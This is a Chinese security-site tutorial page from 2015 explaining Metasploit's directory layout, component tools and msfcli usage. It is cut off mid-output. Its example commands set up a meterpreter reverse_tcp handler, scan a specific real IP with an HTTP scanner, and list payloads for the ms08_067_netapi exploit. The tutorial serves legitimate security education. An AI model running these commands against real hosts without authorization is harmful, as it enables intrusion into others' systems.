<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>Metasploit的模块构成及功能介绍 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Metasploit,模块结构,功能"/>
    
        <meta name="description" content="metasploit的模块构成及功能分析今天我们介绍一下metasploit的基础架构和市面上介绍metasploit的书不少，网上metasploit的使用说明的文章更是满天飞，可是没有哪一本书或者"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>Metasploit的模块构成及功能介绍</h2>
                <div class="article-msg">
                    <span class="time">2015-01-12 16:44:39</span>
                                        <span class="read">阅读：70891次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_201"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="201" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://www.milsec.net/research_lab/87.html"
                             target="_blank">来源： milsec</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><img alt="http://p7.qhimg.com/t0147412221a8d0cd59.jpg" src="http://p7.qhimg.com/t0147412221a8d0cd59.jpg" title="t0147412221a8d0cd59.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">metasploit的模块构成及功能分析<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">今天我们介绍一下metasploit的基础架构和<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">市面上介绍metasploit的书不少，网上metasploit的使用说明的文章更是满天飞，可是没有哪一本书或者哪一篇文章来介绍metasploit的目录结构和他的功能，今天我们就来介绍一下metasploit的文件结构和每个部分的功能以及参数。</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;ls
CONTRIBUTING.md&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;README.md&nbsp;&nbsp;data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metasploit-framework-db.gemspec&nbsp;&nbsp;&nbsp;&nbsp;msfconsole&nbsp;&nbsp;&nbsp;msfrop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;putty.exe
COPYING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rakefile&nbsp;&nbsp;&nbsp;db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metasploit-framework-full.gemspec&nbsp;&nbsp;msfd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;script
Gemfile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;documentation&nbsp;&nbsp;metasploit-framework-pcap.gemspec&nbsp;&nbsp;msfelfscan&nbsp;&nbsp;&nbsp;msfrpcd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;scripts
Gemfile.local.example&nbsp;&nbsp;app&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;external&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metasploit-framework.gemspec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfencode&nbsp;&nbsp;&nbsp;&nbsp;msfupdate&nbsp;&nbsp;&nbsp;&nbsp;spec
Gemfile.lock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;av.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;features&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modules&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfmachscan&nbsp;&nbsp;msfvenom&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test
HACKING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;back.pl&nbsp;&nbsp;&nbsp;&nbsp;lib&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfbinscan&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfpayload&nbsp;&nbsp;&nbsp;payload.exe&nbsp;&nbsp;tools
LICENSE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfcli&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfpescan&nbsp;&nbsp;&nbsp;&nbsp;plugins</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">通过以上我们可以看到metasploit的基本为文件结构<br/></span></p><pre class="brush:bash;toolbar:false">config&nbsp;－－metasploit的环境配置信息，数据库配置信息
data－－后渗透模块的一些工具及payload，第三方小工具集合，用户字典等数据信息
db－－rails编译生成msf的web框架时的数据库信息
documentation－－用户说明文档及开发文档
external－－metasploit的一些基础扩展模块
libs－－metasploit的一些基础类和第三方模块类
log－－msf运行时的一些系统信息和其他信息
modules－－metasploit的系统工具模块，包括预辅助模块（auxiliary），渗透模块(exploits),攻击荷载(payloads)和后渗透模块(posts)，以及空字段模块(nops)和编码模块(Encoders)
msfbinscan－－对bin文件进行文件偏移地址扫描
msfcli－－metasploit命令行模式，可以快速调用有效的payload进行攻击，新版本的metasploit即将在2015年6月18日弃用
msfconsole－－metasploit的基本命令行，集成了各种功能。
msfd－－metasploit服务，非持久性服务
msfelfscan－－对linux的elf文件偏移地址进行扫描
msfencode－－metasploit的编码模块，可以对mepayload和shellcode进行编码输出
msfpayload－－metasploit攻击荷载，用以调用不同的攻击荷载，生成和输出不同格式的shellocode，新版本的metasploit即将在2015年6月18日弃用，用msfvenmon替代。
msfmachscan－－功能同msfelfscan
msfpescan－－对windows的pe格式文件偏移地址进行扫描
msfrop－－对windows的pe进行文件地址偏移操作，可以绕过alsr等
msfrpc－－metasploit的服务端，非持久性的rpc服务
msfrpcd－－持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务，可以通过xml进行数据传输。
msfupdate－－metasploit更新模块，可以用来更新metasploit模块
msfvenom－－集成了msfpayload和msfencode的功能，效率更高，即将替代msf&nbsp;payload和msfencode
plugins－－metasploit的第三方插件接口
scripts－－metasplit的常用后渗透模块，区别于data里的后渗透模块，不需要加post参数和绝对路径，可以直接运行
test－－metasploit的基本测试目录
tools－－额外的小工具和第三方脚本工具</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">下面我们对这些常用命令的用法做一些解释<br/>msfcli 虽然和msfconsole一样同为命令行界面，但是他不提供交互的命令行模式，直接通过命令行执行输出结果，直接调用辅助模块和攻击模块对目标进行渗透攻击，更为高效便捷。<br/></span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;-h
[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfcli&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfconsole&nbsp;-r&nbsp;or&nbsp;-x&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/3802&nbsp;&nbsp;&nbsp;*
[!]&nbsp;************************************************************************
Usage:&nbsp;/usr/local/bin/msfcli&nbsp;&nbsp;[mode]
=================================================================
Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description
—-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;———–
(A)dvanced&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;available&nbsp;advanced&nbsp;options&nbsp;for&nbsp;this&nbsp;module&nbsp;＃显示该模块的高级选项
(AC)tions&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;available&nbsp;actions&nbsp;for&nbsp;this&nbsp;module&nbsp;＃显示该模块的详细设置操作选项
(C)heck&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;the&nbsp;check&nbsp;routine&nbsp;of&nbsp;the&nbsp;selected&nbsp;module&nbsp;＃运行选择的模块进行检测
(E)xecute&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Execute&nbsp;the&nbsp;selected&nbsp;module&nbsp;&nbsp;＃执行选择的模块
(H)elp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You’re&nbsp;looking&nbsp;at&nbsp;it&nbsp;baby!&nbsp;&nbsp;＃显示msfcli的帮助信息
(I)DS&nbsp;Evasion&nbsp;&nbsp;Show&nbsp;available&nbsp;ids&nbsp;evasion&nbsp;options&nbsp;for&nbsp;this&nbsp;module&nbsp;&nbsp;＃显示该模块的ids
(M)issing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;empty&nbsp;required&nbsp;options&nbsp;for&nbsp;this&nbsp;module&nbsp;＃查看必须的操作选项有哪些没有设置
(O)ptions&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;available&nbsp;options&nbsp;for&nbsp;this&nbsp;module&nbsp;＃查看可用的选项
(P)ayloads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;available&nbsp;payloads&nbsp;for&nbsp;this&nbsp;module&nbsp;#查看模块可用的payload模块
(S)ummary&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;information&nbsp;about&nbsp;this&nbsp;module&nbsp;&nbsp;&nbsp;＃显示该模块的详细信息
(T)argets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Show&nbsp;available&nbsp;targets&nbsp;for&nbsp;this&nbsp;exploit&nbsp;module&nbsp;&nbsp;＃显示该溢出模块针对的目标类型
Examples:
msfcli&nbsp;multi/handler&nbsp;payload=windows/meterpreter/reverse_tcp&nbsp;lhost=IP&nbsp;E
msfcli&nbsp;auxiliary/scanner/http/http_version&nbsp;rhosts=IP&nbsp;encoder=&nbsp;post=&nbsp;nop=&nbsp;E</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里我们就msfcli的一些具体的参数来解释：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">最常见的用法就是利用metasploit的辅助模块和攻击模块对目标进行操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里我们针对http_version的模块选项进行显示，查看有哪些操作选项。</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;auxiliary/scanner/http/http_version&nbsp;rhost=106.186.118.91&nbsp;O[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfcli&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfconsole&nbsp;-r&nbsp;or&nbsp;-x&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/3802&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;Initializing&nbsp;modules…
Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;—-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;—————&nbsp;&nbsp;——–&nbsp;&nbsp;———–
&nbsp;&nbsp;&nbsp;Proxies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;a&nbsp;proxy&nbsp;chain
&nbsp;&nbsp;&nbsp;RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address&nbsp;range&nbsp;or&nbsp;CIDR&nbsp;identifier
&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;port
&nbsp;&nbsp;&nbsp;THREADS&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;number&nbsp;of&nbsp;concurrent&nbsp;threads
&nbsp;&nbsp;&nbsp;VHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP&nbsp;server&nbsp;virtual&nbsp;host</pre><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;exploits/windows/smb/ms08_067_netapi&nbsp;P</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里会显示针对ms08_067可以使用的payload的信息，我们可以根据我们的系统平台环境和网络环境进行选择。</span><br/></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;exploits/windows/smb/ms08_067_netapi&nbsp;P</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">显示08067的操作高级属性，这样在有针对性的针对某些版本溢出时，可以达到更好的效果<br/></span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfcli&nbsp;exploits/windows/smb/ms08_067_netapi&nbsp;P[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfcli&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfconsole&nbsp;-r&nbsp;or&nbsp;-x&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/3802&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;Initializing&nbsp;modules...
Compatible&nbsp;payloads===================
&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description
